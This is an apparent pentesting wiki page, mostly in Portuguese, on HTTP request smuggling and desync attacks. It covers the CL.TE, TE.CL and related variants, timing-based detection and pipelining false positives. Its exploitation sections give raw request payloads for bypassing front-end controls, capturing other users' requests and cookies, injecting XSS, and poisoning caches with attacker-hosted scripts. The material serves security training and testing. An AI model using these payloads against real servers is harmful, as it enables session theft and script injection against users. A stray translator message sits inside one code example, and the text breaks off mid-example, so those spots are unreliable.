# HTTP Request Smuggling / HTTP Desync Attack

{{#include ../../banners/hacktricks-training.md}}


## O que é

Esta vulnerabilidade ocorre quando uma **dessincronização** entre os **front-end proxies** e o servidor **back-end** permite que um **attacker** **envie** uma HTTP **request** que será **interpretada** como uma **única request** pelos **front-end** (load balance/reverse-proxy) e **como 2 requests** pelo servidor **back-end**.\
Isso permite que um usuário **modifique a próxima request que chegar ao servidor back-end após a dele**.

### Teoria

[**RFC Specification (2161)**](https://tools.ietf.org/html/rfc2616)

> If a message is received with both a Transfer-Encoding header field and a Content-Length header field, the latter MUST be ignored.

**Content-Length**

> The Content-Length entity header indicates the size of the entity-body, in bytes, sent to the recipient.

**Transfer-Encoding: chunked**

> The Transfer-Encoding header specifies the form of encoding used to safely transfer the payload body to the user.\
> Chunked means that large data is sent in a series of chunks

### Realidade

O **Front-End** (um load-balance / Reverse Proxy) **processa** o cabeçalho _**Content-Length**_ ou o _**Transfer-Encoding**_ e o servidor **Back-end** **processa o outro**, provocando uma **dessincronização** entre os 2 sistemas.\
Isto pode ser muito crítico, pois **um attacker poderá enviar uma request** ao reverse proxy que será **interpretada** pelo servidor **back-end** **como 2 requests diferentes**. O **perigo** desta técnica reside no fato de que o **back-end** irá interpretar a **2ª request injetada** como se ela **viesse do próximo cliente** e a **request real** desse cliente fará **parte** da **request injetada**.

### Particularidades

Lembre-se que em HTTP **um caractere de new line é composto por 2 bytes:**

- **Content-Length**: Este header usa um **número decimal** para indicar o **número** de **bytes** do **body** da request. Espera-se que o body termine no último caractere; **uma new line não é necessária no fim da request**.
- **Transfer-Encoding:** Este header usa no **body** um **número hexadecimal** para indicar o **número** de **bytes** do **próximo chunk**. O **chunk** deve **terminar** com uma **new line**, mas essa new line **não é contada** pelo indicador de tamanho. Este método de transferência deve terminar com um **chunk de tamanho 0 seguido por 2 new lines**: `0`
- **Connection**: Pela minha experiência, é recomendado usar **`Connection: keep-alive`** na primeira request do Request Smuggling.

### Visible - Hidden

O principal problema com HTTP/1.1 é que todas as requests usam o mesmo socket TCP, então se uma discrepância for encontrada entre 2 sistemas que recebem requests, é possível enviar uma request que será tratada como 2 requests diferentes (ou mais) pelo backend final (ou até por sistemas intermediários).

[This blog post](https://portswigger.net/research/http1-must-die) propõe novas formas de detectar desync attacks num sistema que não serão sinalizadas por WAFs. Para isso apresenta os comportamentos Visible vs Hidden. O objetivo aqui é tentar encontrar discrepâncias nas respostas usando técnicas que poderiam estar causando desyncs sem realmente explorar nada.

Por exemplo, enviar uma request com o cabeçalho normal Host e um cabeçalho " host", se o backend reclamar sobre essa request (talvez porque o valor de " host" está incorreto) isso pode significar que o front-end não levou em conta o cabeçalho " host" enquanto o backend final sim, implicando uma forte probabilidade de dessincronização entre front-end e backend.

Isto seria uma discrepância **Hidden-Visible**.

Se o front-end tivesse levado em conta o cabeçalho " host" mas o back-end não, isso poderia ser uma situação **Visible-Hidden**.

Por exemplo, isso permitiu descobrir desyncs entre AWS ALB como front-end e IIS como backend. Isso ocorreu porque quando o "Host: foo/bar" foi enviado, o ALB retornou `400, Server; awselb/2.0`, mas quando "Host : foo/bar" foi enviado, retornou `400, Server: Microsoft-HTTPAPI/2.0`, indicando que o backend estava enviando a resposta. Isto é uma situação Hidden-Visible (H-V).

Note que esta situação não é corrigida pela AWS, mas pode ser prevenida configurando `routing.http.drop_invalid_header_fields.enabled` e `routing.http.desync_mitigation_mode = strictest`.


## Exemplos Básicos

> [!TIP]
> Ao tentar explorar isso com Burp Suite **desative `Update Content-Length` e `Normalize HTTP/1 line endings`** no Repeater porque alguns gadgets abusam de newlines, carriage returns e Content-Lengths malformados.

HTTP request smuggling attacks são criadas enviando requests ambíguas que exploram discrepâncias em como front-end e back-end interpretam os headers `Content-Length` (CL) e `Transfer-Encoding` (TE). Esses ataques podem se manifestar de diferentes formas, principalmente como **CL.TE**, **TE.CL** e **TE.TE**. Cada tipo representa uma combinação diferente de como os servidores front-end e back-end priorizam esses headers. As vulnerabilidades surgem quando os servidores processam a mesma request de maneiras diferentes, levando a resultados inesperados e potencialmente maliciosos.

### Exemplos Básicos de Tipos de Vulnerabilidade

![https://twitter.com/SpiderSec/status/1200413390339887104?ref_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1200413390339887104&ref_url=https%3A%2F%2Ftwitter.com%2FSpiderSec%2Fstatus%2F1200413390339887104](../../images/EKi5edAUUAAIPIK.jpg)

> [!TIP]
> Ao arquivo anterior você deve adicionar a técnica TE.0, semelhante à técnica CL.0 mas usando Transfer-Encoding.

#### CL.TE Vulnerability (Content-Length usado pelo Front-End, Transfer-Encoding usado pelo Back-End)

- **Front-End (CL):** Processa a request com base no header `Content-Length`.
- **Back-End (TE):** Processa a request com base no header `Transfer-Encoding`.
- **Cenário de ataque:**

- O atacante envia uma request onde o valor do header `Content-Length` não corresponde ao comprimento real do conteúdo.
- O servidor front-end encaminha a request inteira para o back-end, com base no valor de `Content-Length`.
- O servidor back-end processa a request como chunked devido ao header `Transfer-Encoding: chunked`, interpretando os dados restantes como uma request subsequente separada.
- **Exemplo:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 30
Connection: keep-alive
Transfer-Encoding: chunked

0

GET /404 HTTP/1.1
Foo: x
```

#### TE.CL Vulnerability (Transfer-Encoding usado pelo Front-End, Content-Length usado pelo Back-End)

- **Front-End (TE):** Processa a request com base no header `Transfer-Encoding`.
- **Back-End (CL):** Processa a request com base no header `Content-Length`.
- **Cenário de ataque:**

- O atacante envia uma request chunked onde o tamanho do chunk (`7b`) e o comprimento real do conteúdo (`Content-Length: 4`) não coincidem.
- O front-end, respeitando `Transfer-Encoding`, encaminha a request inteira para o back-end.
- O back-end, respeitando `Content-Length`, processa apenas a parte inicial da request (os `7b` bytes), deixando o restante como parte de uma request subsequente não intencional.
- **Exemplo:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 4
Connection: keep-alive
Transfer-Encoding: chunked

7b
GET /404 HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 30

x=
0

```

#### TE.TE Vulnerability (Transfer-Encoding usado por ambos, com obfuscação)

- **Servidores:** Ambos suportam `Transfer-Encoding`, mas um pode ser enganado a ignorá-lo via obfuscação.
- **Cenário de ataque:**

- O atacante envia uma request com headers `Transfer-Encoding` obfuscados.
- Dependendo de qual servidor (front-end ou back-end) falhar ao reconhecer a obfuscação, uma vulnerabilidade CL.TE ou TE.CL pode ser explorada.
- A parte não processada da request, como vista por um dos servidores, torna-se parte de uma request subsequente, levando ao smuggling.
- **Exemplo:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: xchunked
Transfer-Encoding : chunked
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding:[tab]chunked
[space]Transfer-Encoding: chunked
X: X[\n]Transfer-Encoding: chunked

Transfer-Encoding
: chunked
```

#### **CL.CL Scenario (Content-Length usado por ambos Front-End e Back-End)**

- Ambos os servidores processam a request baseados exclusivamente no header `Content-Length`.
- Este cenário tipicamente não leva ao smuggling, pois há alinhamento em como ambos interpretam o comprimento da request.
- **Exemplo:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 16
Connection: keep-alive

Normal Request
```

#### **CL.0 Scenario**

- Refere-se a cenários onde o header `Content-Length` está presente e tem um valor diferente de zero, indicando que o body da request tem conteúdo. O back-end ignora o header `Content-Length` (que é tratado como 0), mas o front-end o analisa.
- É crucial para entender e construir ataques de smuggling, já que influencia como os servidores determinam o fim de uma request.
- **Exemplo:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 16
Connection: keep-alive

Non-Empty Body
```

#### TE.0 Scenario

- Igual ao anterior, mas usando TE
- Técnica [reported here](https://www.bugcrowd.com/blog/unveiling-te-0-http-request-smuggling-discovering-a-critical-vulnerability-in-thousands-of-google-cloud-websites/)
- **Example**:
```
OPTIONS / HTTP/1.1
Host: {HOST}
Accept-Encoding: gzip, deflate, br
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.122 Safari/537.36
Transfer-Encoding: chunked
Connection: keep-alive

50
GET <http://our-collaborator-server/> HTTP/1.1
x: X
0
EMPTY_LINE_HERE
EMPTY_LINE_HERE
```
#### `0.CL` Cenário

Em um cenário `0.CL`, uma requisição é enviada com um Content-Length como:
```
GET /Logon HTTP/1.1
Host: <redacted>
Content-Length:
7

GET /404 HTTP/1.1
X: Y
```
E o front-end não leva o `Content-Length` em conta, então ele envia apenas a primeira request para o backend (até o 7 no exemplo). No entanto, o backend vê o `Content-Length` e espera por um body que nunca chega, porque o front-end já está aguardando pela response.

Porém, se existir uma request que possa ser enviada ao backend e que seja respondida antes de receber o body da request, esse deadlock não ocorrerá. No IIS, por exemplo, isso acontece ao enviar requests para palavras proibidas como `/con` (check the [documentation](https://learn.microsoft.com/en-us/windows/win32/fileio/naming-a-file)), dessa forma a request inicial será respondida diretamente e a segunda request conterá a request da vítima como:
```
GET / HTTP/1.1
X: yGET /victim HTTP/1.1
Host: <redacted>
```
Isso é útil para causar um desync, mas não terá qualquer impacto até agora.

However, the post offers a solution for this by converting a **[0.CL attack into a CL.0 with a double desync](https://portswigger.net/research/http1-must-die)**.

#### Quebrando o servidor web

Esta técnica também é útil em cenários onde é possível **break a web server while reading the initial HTTP data** mas **without closing the connection**. Dessa forma, o **body** of the HTTP request será considerado a **next HTTP request**.

Por exemplo, como explicado em [**this writeup**](https://mizu.re/post/twisty-python), In Werkzeug era possível enviar alguns **Unicode** characters e isso fará o servidor **break**. However, if the HTTP connection was created with the header **`Connection: keep-alive`**, the body of the request won’t be read and the connection will still be open, so the **body** of the request will be treated as the **next HTTP request**.

#### Forçando via hop-by-hop headers

Abusando de hop-by-hop headers você poderia indicar ao proxy para **delete the header Content-Length or Transfer-Encoding so a HTTP request smuggling is possible to abuse**.
```
Connection: Content-Length
```
Para **mais informações sobre hop-by-hop headers** visite:


{{#ref}}
../abusing-hop-by-hop-headers.md
{{#endref}}

## Finding HTTP Request Smuggling

Identificar vulnerabilidades de HTTP request smuggling frequentemente pode ser feito usando técnicas de temporização, que dependem de observar quanto tempo o servidor demora a responder a requisições manipuladas. Essas técnicas são particularmente úteis para detectar vulnerabilidades CL.TE e TE.CL. Além desses métodos, existem outras estratégias e ferramentas que podem ser usadas para encontrar tais vulnerabilidades:

### Finding CL.TE Vulnerabilities Using Timing Techniques

- **Método:**

- Envie uma requisição que, se a aplicação for vulnerável, fará o servidor back-end esperar por dados adicionais.
- **Exemplo:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 4

1
A
0
```

- **Observação:**
- O servidor front-end processa a requisição com base em `Content-Length` e corta a mensagem prematuramente.
- O servidor back-end, esperando uma mensagem chunked, aguarda pelo próximo chunk que nunca chega, causando um atraso.

- **Indicadores:**
- Time-outs ou longos atrasos na resposta.
- Receber um 400 Bad Request do servidor back-end, às vezes com informações detalhadas do servidor.

### Finding TE.CL Vulnerabilities Using Timing Techniques

- **Método:**

- Envie uma requisição que, se a aplicação for vulnerável, fará o servidor back-end esperar por dados adicionais.
- **Exemplo:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 6

0
X
```

- **Observação:**
- O servidor front-end processa a requisição com base em `Transfer-Encoding` e encaminha a mensagem inteira.
- O servidor back-end, esperando uma mensagem baseada em `Content-Length`, aguarda por dados adicionais que nunca chegam, causando um atraso.

### Other Methods to Find Vulnerabilities

- **Differential Response Analysis:**
- Envie versões ligeiramente variadas de uma requisição e observe se as respostas do servidor diferem de forma inesperada, indicando uma discrepância de parsing.
- **Using Automated Tools:**
- Ferramentas como a extensão 'HTTP Request Smuggler' do Burp Suite podem testar automaticamente essas vulnerabilidades enviando várias formas de requisições ambíguas e analisando as respostas.
- **Content-Length Variance Tests:**
- Envie requisições com valores de `Content-Length` variando e que não correspondem ao tamanho real do conteúdo e observe como o servidor lida com essas discrepâncias.
- **Transfer-Encoding Variance Tests:**
- Envie requisições com cabeçalhos `Transfer-Encoding` ofuscados ou malformados e monitore como front-end e back-end respondem de maneira diferente a essas manipulações.

### The `Expect: 100-continue` header

Veja como esse header pode ajudar a explorar um http desync em:

{{#ref}}
../../network-services-pentesting/pentesting-web/special-http-headers.md
{{#endref}}

### HTTP Request Smuggling Vulnerability Testing

Após confirmar a efetividade das técnicas de temporização, é crucial verificar se requisições de clientes podem ser manipuladas. Um método simples é tentar envenenar suas requisições, por exemplo, fazer uma requisição a `/` retornar um 404. Os exemplos `CL.TE` e `TE.CL` discutidos anteriormente em [Basic Examples](#basic-examples) demonstram como envenenar a requisição de um cliente para provocar um 404, apesar de o cliente tentar acessar um recurso diferente.

**Key Considerations**

Ao testar request smuggling interferindo em outras requisições, tenha em mente:

- **Distinct Network Connections:** As requisições "attack" e "normal" devem ser enviadas por conexões de rede distintas. Usar a mesma conexão para ambas não valida a presença da vulnerabilidade.
- **Consistent URL and Parameters:** Procure usar URLs idênticas e os mesmos nomes de parâmetros para ambas as requisições. Aplicações modernas frequentemente roteiam requisições para servidores back-end específicos com base na URL e nos parâmetros. Casá-las aumenta a probabilidade de que ambas sejam processadas pelo mesmo servidor, requisito para um ataque bem-sucedido.
- **Timing and Racing Conditions:** A requisição "normal", destinada a detectar interferência da requisição "attack", compete com outras requisições concorrentes da aplicação. Portanto, envie a requisição "normal" imediatamente após a "attack". Aplicações muito ocupadas podem exigir várias tentativas para confirmação conclusiva da vulnerabilidade.
- **Load Balancing Challenges:** Servidores front-end atuando como load balancers podem distribuir requisições entre vários sistemas back-end. Se as requisições "attack" e "normal" caírem em sistemas diferentes, o ataque não terá sucesso. Esse aspecto de balanceamento pode exigir várias tentativas para confirmar uma vulnerabilidade.
- **Unintended User Impact:** Se seu ataque afetar inadvertidamente a requisição de outro usuário (não a requisição "normal" que você enviou para detecção), isso indica que seu ataque influenciou outro usuário da aplicação. Testes contínuos podem atrapalhar outros usuários, exigindo uma abordagem cautelosa.

## Distinguishing HTTP/1.1 pipelining artifacts vs genuine request smuggling

Connection reuse (keep-alive) e pipelining podem facilmente produzir ilusões de "smuggling" em ferramentas de teste que enviam múltiplas requisições no mesmo socket. Aprenda a separar artefatos inofensivos do lado do cliente de um real desync do lado do servidor.

### Why pipelining creates classic false positives

HTTP/1.1 reutiliza uma única conexão TCP/TLS e concatena requisições e respostas no mesmo stream. No pipelining, o cliente envia múltiplas requisições seguidas e espera respostas em ordem. Um falso positivo comum é reenviar um payload malformado no estilo CL.0 duas vezes em uma única conexão:
```
POST / HTTP/1.1
Host: hackxor.net
Content_Length: 47

GET /robots.txt HTTP/1.1
X: Y
```
Por favor cole aqui o conteúdo do arquivo src/pentesting-web/http-request-smuggling/README.md que você quer que eu traduza para português. Vou manter exatamente a mesma sintaxe Markdown/HTML e não traduzirei código, nomes de técnicas, palavras comuns de hacking, plataformas cloud, links, paths ou tags.
```
HTTP/1.1 200 OK
Content-Type: text/html

```

```
HTTP/1.1 200 OK
Content-Type: text/plain

User-agent: *
Disallow: /settings
```
Se o servidor ignorou o `Content_Length` malformado, não há FE↔BE desync. Com reuso, seu cliente na verdade enviou este fluxo de bytes, que o servidor interpretou como duas requisições independentes:
```
POST / HTTP/1.1
Host: hackxor.net
Content_Length: 47

GET /robots.txt HTTP/1.1
X: YPOST / HTTP/1.1
Host: hackxor.net
Content_Length: 47

GET /robots.txt HTTP/1.1
X: Y
```
Impacto: nenhum. Você apenas desincronizou seu cliente do framing do servidor.

> [!TIP]
> Burp modules that depend on reuse/pipelining: Turbo Intruder with `requestsPerConnection>1`, Intruder with "HTTP/1 connection reuse", Repeater "Send group in sequence (single connection)" or "Enable connection reuse".

### Testes decisivos: pipelining ou desync real?

1. Disable reuse and re-test
- In Burp Intruder/Repeater, turn off HTTP/1 reuse and avoid "Send group in sequence".
- In Turbo Intruder, set `requestsPerConnection=1` and `pipeline=False`.
- If the behavior disappears, it was likely client-side pipelining, unless you’re dealing with connection-locked/stateful targets or client-side desync.
2. HTTP/2 nested-response check
- Send an HTTP/2 request. If the response body contains a complete nested HTTP/1 response, you’ve proven a backend parsing/desync bug instead of a pure client artifact.
3. Partial-requests probe for connection-locked front-ends
- Some FEs only reuse the upstream BE connection if the client reused theirs. Use partial-requests to detect FE behavior that mirrors client reuse.
- See PortSwigger "Browser‑Powered Desync Attacks" for the connection-locked technique.
4. State probes
- Look for first- vs subsequent-request differences on the same TCP connection (first-request routing/validation).
- Burp "HTTP Request Smuggler" includes a connection‑state probe that automates this.
5. Visualize the wire
- Use the Burp "HTTP Hacker" extension to inspect concatenation and message framing directly while experimenting with reuse and partial requests.

### Connection‑locked request smuggling (reuse-required)

Some front-ends only reuse the upstream connection when the client reuses theirs. Real smuggling exists but is conditional on client-side reuse. To distinguish and prove impact:
- Prove the server-side bug
- Use the HTTP/2 nested-response check, or
- Use partial-requests to show the FE only reuses upstream when the client does.
- Show real impact even if direct cross-user socket abuse is blocked:
- Cache poisoning: poison shared caches via the desync so responses affect other users.
- Internal header disclosure: reflect FE-injected headers (e.g., auth/trust headers) and pivot to auth bypass.
- Bypass FE controls: smuggle restricted paths/methods past the front-end.
- Host-header abuse: combine with host routing quirks to pivot to internal vhosts.
- Operator workflow
- Reproduce with controlled reuse (Turbo Intruder `requestsPerConnection=2`, or Burp Repeater tab group → "Send group in sequence (single connection)").
- Then chain to cache/header-leak/control-bypass primitives and demonstrate cross-user or authorization impact.

> See also connection‑state attacks, which are closely related but not technically smuggling:
>
>{{#ref}}
>../http-connection-request-smuggling.md
>
{{#endref}}

### Client‑side desync constraints

If you’re targeting browser-powered/client-side desync, the malicious request must be sendable by a browser cross-origin. Header obfuscation tricks won’t work. Focus on primitives reachable via navigation/fetch, and then pivot to cache poisoning, header disclosure, or front-end control bypass where downstream components reflect or cache responses.

For background and end-to-end workflows:

{{#ref}}
browser-http-request-smuggling.md
{{#endref}}

### Tooling to help decide

- HTTP Hacker (Burp BApp Store): exposes low-level HTTP behavior and socket concatenation.
- "Smuggling or pipelining?" Burp Repeater Custom Action: https://github.com/PortSwigger/bambdas/blob/main/CustomAction/SmugglingOrPipelining.bambda
- Turbo Intruder: precise control over connection reuse via `requestsPerConnection`.
- Burp HTTP Request Smuggler: includes a connection‑state probe to spot first‑request routing/validation.

> [!NOTE]
> Treat reuse-only effects as non-issues unless you can prove server-side desync and attach concrete impact (poisoned cache artifact, leaked internal header enabling privilege bypass, bypassed FE control, etc.).

## Abusing HTTP Request Smuggling

### Circumventing Front-End Security via HTTP Request Smuggling

Sometimes, front-end proxies enforce security measures, scrutinizing incoming requests. However, these measures can be circumvented by exploiting HTTP Request Smuggling, allowing unauthorized access to restricted endpoints. For instance, accessing `/admin` might be prohibited externally, with the front-end proxy actively blocking such attempts. Nonetheless, this proxy may neglect to inspect embedded requests within a smuggled HTTP request, leaving a loophole for bypassing these restrictions.

Consider the following examples illustrating how HTTP Request Smuggling can be used to bypass front-end security controls, specifically targeting the `/admin` path which is typically guarded by the front-end proxy:

**CL.TE Exemplo**
```
POST / HTTP/1.1
Host: [redacted].web-security-academy.net
Cookie: session=[redacted]
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 67
Transfer-Encoding: chunked

0
GET /admin HTTP/1.1
Host: localhost
Content-Length: 10

x=
```
No ataque CL.TE, o cabeçalho `Content-Length` é aproveitado para a requisição inicial, enquanto a requisição embutida subsequente utiliza o cabeçalho `Transfer-Encoding: chunked`. O proxy front-end processa a requisição `POST` inicial, mas não inspeciona a requisição embutida `GET /admin`, permitindo acesso não autorizado ao caminho `/admin`.

**TE.CL Example**
```
POST / HTTP/1.1
Host: [redacted].web-security-academy.net
Cookie: session=[redacted]
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive
Content-Length: 4
Transfer-Encoding: chunked
2b
GET /admin HTTP/1.1
Host: localhost
a=x
0

```
Por outro lado, no ataque TE.CL, o `POST` inicial usa `Transfer-Encoding: chunked`, e a request embutida subsequente é processada com base no cabeçalho `Content-Length`. Semelhante ao ataque CL.TE, o proxy front-end ignora a requisição smuggled `GET /admin`, concedendo inadvertidamente acesso ao caminho restrito `/admin`.

### Revelando reescrita de requests do front-end <a href="#revealing-front-end-request-rewriting" id="revealing-front-end-request-rewriting"></a>

As aplicações frequentemente empregam um **front-end server** para modificar incoming requests antes de repassá-las ao **back-end server**. Uma modificação típica envolve adicionar headers, tais como `X-Forwarded-For: <IP of the client>`, para transmitir o IP do cliente ao back-end. Entender essas modificações pode ser crucial, pois pode revelar formas de **bypass protections** ou **descobrir informações ou endpoints ocultos**.

Para investigar como um proxy altera uma request, localize um parâmetro POST que o back-end ecoa na resposta. Em seguida, construa uma request, usando esse parâmetro por último, semelhante ao seguinte:
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 130
Connection: keep-alive
Transfer-Encoding: chunked

0

POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 100

search=
```
Nesta estrutura, componentes subsequentes do request são anexados após `search=`, que é o parâmetro refletido na resposta. Essa reflexão irá expor os headers do request subsequente.

É importante alinhar o header `Content-Length` do request aninhado com o comprimento real do conteúdo. Começar com um valor pequeno e aumentá-lo gradualmente é aconselhável, pois um valor muito baixo truncará os dados refletidos, enquanto um valor muito alto pode fazer com que o request gere erro.

Essa técnica também é aplicável no contexto de uma vulnerabilidade TE.CL, mas o request deve terminar com `search=\r\n0`. Independentemente dos caracteres de nova linha, os valores serão anexados ao parâmetro `search`.

Esse método serve principalmente para entender as modificações do request feitas pelo proxy de front-end, essencialmente realizando uma investigação autodirigida.

### Capturando as requests de outros usuários <a href="#capturing-other-users-requests" id="capturing-other-users-requests"></a>

É possível capturar as requests do próximo usuário anexando uma request específica como valor de um parâmetro durante uma operação POST. Veja como isso pode ser feito:

Anexando a seguinte request como valor de um parâmetro, você pode armazenar a request do cliente subsequente:
```
POST / HTTP/1.1
Host: ac031feb1eca352f8012bbe900fa00a1.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 319
Connection: keep-alive
Cookie: session=4X6SWQeR8KiOPZPF2Gpca2IKeA1v4KYi
Transfer-Encoding: chunked

0

POST /post/comment HTTP/1.1
Host: ac031feb1eca352f8012bbe900fa00a1.web-security-academy.net
Content-Length: 659
Content-Type: application/x-www-form-urlencoded
Cookie: session=4X6SWQeR8KiOPZPF2Gpca2IKeA1v4KYi

csrf=gpGAVAbj7pKq7VfFh45CAICeFCnancCM&postId=4&name=asdfghjklo&email=email%40email.com&comment=
```
Neste cenário, o **parâmetro comment** destina-se a armazenar o conteúdo da seção de comentários de um post em uma página publicamente acessível. Consequentemente, o conteúdo da requisição subsequente aparecerá como um comentário.

No entanto, esta técnica tem limitações. Geralmente, ela captura dados apenas até o delimitador de parâmetro usado na requisição smuggled. Para envios de formulário URL-encoded, esse delimitador é o caractere `&`. Isso significa que o conteúdo capturado da requisição do usuário vítima vai parar no primeiro `&`, que pode até fazer parte da query string.

Além disso, vale notar que esta abordagem também é viável com uma vulnerabilidade TE.CL. Nesses casos, a requisição deve terminar com `search=\r\n0`. Independentemente dos caracteres de nova linha, os valores serão anexados ao parâmetro search.

### Usando HTTP request smuggling para explorar Reflected XSS

HTTP Request Smuggling pode ser aproveitado para explorar páginas web vulneráveis a **Reflected XSS**, oferecendo vantagens significativas:

- A interação com os usuários alvo **não é necessária**.
- Permite a exploração de XSS em partes da requisição que são **normalmente inalcançáveis**, como os headers da requisição HTTP.

Em cenários onde um site é suscetível a Reflected XSS através do header User-Agent, o seguinte payload demonstra como explorar essa vulnerabilidade:
```
POST / HTTP/1.1
Host: ac311fa41f0aa1e880b0594d008d009e.web-security-academy.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0
Cookie: session=ac311fa41f0aa1e880b0594d008d009e
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 213
Content-Type: application/x-www-form-urlencoded

0

GET /post?postId=2 HTTP/1.1
Host: ac311fa41f0aa1e880b0594d008d009e.web-security-academy.net
User-Agent: "><script>alert(1)</script>
Content-Length: 10
Content-Type: application/x-www-form-urlencoded

A=
```
Este payload é estruturado para explorar a vulnerabilidade da seguinte forma:

1. Iniciando uma requisição `POST`, aparentemente típica, com o cabeçalho `Transfer-Encoding: chunked` para indicar o início do smuggling.
2. Em seguida com um `0`, marcando o fim do corpo da mensagem chunked.
3. Então, uma requisição `GET` smuggled é inserida, onde o cabeçalho `User-Agent` é injetado com um script, `<script>alert(1)</script>`, disparando o XSS quando o servidor processa essa requisição subsequente.

Ao manipular o `User-Agent` via smuggling, o payload contorna as restrições normais de requisição, explorando assim a vulnerabilidade Reflected XSS de maneira não convencional, mas eficaz.

#### HTTP/0.9

> [!CAUTION]
> Caso o conteúdo do usuário seja refletido em uma resposta com um **`Content-type`** como **`text/plain`**, impedindo a execução do XSS. Se o servidor suportar **HTTP/0.9 pode ser possível contornar isso**!

A versão HTTP/0.9 precedeu a 1.0 e usa apenas o verbo **GET** e **não** responde com **headers**, apenas com o corpo.

Em [**this writeup**](https://mizu.re/post/twisty-python), isso foi abusado com um request smuggling e um vulnerable endpoint que responde com a entrada do usuário para smugglear uma requisição com HTTP/0.9. O parâmetro que seria refletido na resposta continha uma fake HTTP/1.1 response (with headers and body) então a resposta passou a conter código JS executável válido com um `Content-Type` de `text/html`.

### Explorando redirecionamentos on-site com HTTP Request Smuggling <a href="#exploiting-on-site-redirects-with-http-request-smuggling" id="exploiting-on-site-redirects-with-http-request-smuggling"></a>

Aplicações frequentemente redirecionam de uma URL para outra usando o hostname do cabeçalho `Host` na URL de redirect. Isso é comum em web servers como Apache e IIS. Por exemplo, requisitar uma pasta sem a barra final resulta em um redirect para incluir a barra:
```
GET /home HTTP/1.1
Host: normal-website.com
```
Resulta em:
```
HTTP/1.1 301 Moved Permanently
Location: https://normal-website.com/home/
```
Embora aparentemente inofensivo, esse comportamento pode ser manipulado usando HTTP request smuggling para redirecionar usuários para um site externo. Por exemplo:
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 54
Connection: keep-alive
Transfer-Encoding: chunked

0

GET /home HTTP/1.1
Host: attacker-website.com
Foo: X
```
Esta requisição smuggled poderia fazer com que a próxima requisição de usuário processada fosse redirecionada para um site controlado por um atacante:
```
GET /home HTTP/1.1
Host: attacker-website.com
Foo: XGET /scripts/include.js HTTP/1.1
Host: vulnerable-website.com
```
Resulta em:
```
HTTP/1.1 301 Moved Permanently
Location: https://attacker-website.com/home/
```
In this scenario, a user's request for a JavaScript file is hijacked. The attacker can potentially compromise the user by serving malicious JavaScript in response.

### Exploiting Web Cache Poisoning via HTTP Request Smuggling <a href="#exploiting-web-cache-poisoning-via-http-request-smuggling" id="exploiting-web-cache-poisoning-via-http-request-smuggling"></a>

Web cache poisoning pode ser executado se qualquer componente da **front-end infrastructure caches content**, tipicamente para melhorar o desempenho. Manipulando a resposta do servidor, é possível **poison the cache**.

Anteriormente, observamos como as respostas do servidor podiam ser alteradas para retornar um erro 404 (consulte [Basic Examples](#basic-examples)). Da mesma forma, é viável enganar o servidor para que entregue o conteúdo de `/index.html` em resposta a uma requisição por `/static/include.js`. Consequentemente, o conteúdo de `/static/include.js` é substituído na cache pelo de `/index.html`, tornando `/static/include.js` inacessível aos usuários, potencialmente levando a um Denial of Service (DoS).

Essa técnica se torna particularmente potente se for descoberta uma **Open Redirect vulnerability** ou se houver um **on-site redirect to an open redirect**. Tais vulnerabilidades podem ser exploradas para substituir o conteúdo em cache de `/static/include.js` por um script sob controle do atacante, essencialmente possibilitando um ataque generalizado de Cross-Site Scripting (XSS) contra todos os clientes que requisitarem o `/static/include.js` atualizado.

Abaixo está uma ilustração de exploração de **cache poisoning combined with an on-site redirect to open redirect**. O objetivo é alterar o conteúdo em cache de `/static/include.js` para servir código JavaScript controlado pelo atacante:
```
POST / HTTP/1.1
Host: vulnerable.net
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive
Content-Length: 124
Transfer-Encoding: chunked

0

GET /post/next?postId=3 HTTP/1.1
Host: attacker.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=1
```
Observe a request embutida que tem como alvo `/post/next?postId=3`. Essa request será redirecionada para `/post?postId=4`, utilizando o **Host header value** para determinar o domínio. Ao alterar o **Host header**, o atacante pode redirecionar a request para o seu domínio (**on-site redirect to open redirect**).

Após um **socket poisoning** bem-sucedido, uma **GET request** para `/static/include.js` deve ser iniciada. Essa request será contaminada pela anterior **on-site redirect to open redirect** request e buscará o conteúdo do script controlado pelo atacante.

Posteriormente, qualquer request para `/static/include.js` servirá o conteúdo em cache do script do atacante, lançando efetivamente um XSS attack em larga escala.

### Using HTTP request smuggling to perform web cache deception <a href="#using-http-request-smuggling-to-perform-web-cache-deception" id="using-http-request-smuggling-to-perform-web-cache-deception"></a>

> **Qual é a diferença entre web cache poisoning e web cache deception?**
>
> - Em **web cache poisoning**, o atacante faz com que a aplicação armazene conteúdo malicioso no cache, e esse conteúdo é servido a partir do cache para outros usuários da aplicação.
> - Em **web cache deception**, o atacante faz com que a aplicação armazene conteúdo sensível pertencente a outro usuário no cache, e então o atacante recupera esse conteúdo do cache.

O atacante constrói uma smuggled request que obtém conteúdo sensível específico do usuário. Considere o seguinte exemplo:
```markdown
`POST / HTTP/1.1`\
`Host: vulnerable-website.com`\
